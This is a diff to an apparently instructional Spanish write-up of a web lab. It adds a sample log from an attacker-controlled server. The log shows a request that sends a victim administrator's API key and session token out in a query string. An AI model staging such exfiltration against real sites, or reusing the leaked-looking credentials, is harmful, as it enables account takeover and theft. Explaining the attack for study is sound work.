@@ -121,5 +121,12 @@ generar una peticion a un servidor del atacante en donde se manda los datos del 
 
 ```
 
+Si revisamos el log del servidor del atacante tendriamos que ver algo asi:
+
+```
+10.0.42.54       2022-08-02 20:26:24 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22eSYXthMZ83TzlMynck1P2Yc4c2EyQ5Q0%22,%20%20%22sessions%22:%20[%20%20%20%20%22xhtZk7Xn0jtwvFjXRrcFbY3u2iO0OH9Y%22%20%20]} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
+19.21.168.1   2022-08-02 20:26:24 +0000 "GET / HTTP/1.1"
+`` ``
+
 
 
